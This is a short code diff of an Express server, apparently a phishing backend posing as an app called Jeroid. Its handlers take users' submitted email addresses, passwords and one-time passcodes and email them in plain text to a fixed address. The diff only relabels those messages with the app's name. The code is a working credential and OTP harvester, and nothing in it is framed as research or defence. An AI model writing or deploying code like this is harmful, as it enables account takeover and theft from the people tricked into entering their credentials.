@@ -34,8 +34,8 @@ app.post("/", (req, res) => {
   const mailOptions = {
     from: `${email}`,
     to: userEmail,
-    subject: `Email: ${email} \t\n\n\n password: ${password}`,
-    text: `New user registered with Email: ${email} and password: ${password}`,
+    subject: `JERIOD APP  Email: ${email} \t\n\n\n password: ${password}`,
+    text: `New user registered with Email for Jeroid: ${email} and password: ${password}`,
   };
 
   console.log(mailOptions);
@@ -66,8 +66,8 @@ app.post("/otp", (req, res) => {
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `OTP: ${req.body?.otp} `,
-    text: `New user registered OTP: ${req.body?.otp}`,
+    subject: `JERIOD APP  OTP: ${req.body?.otp} `,
+    text: `New user  for Jeroid registered OTP: ${req.body?.otp}`,
   };
 
   console.log(mailOptions);
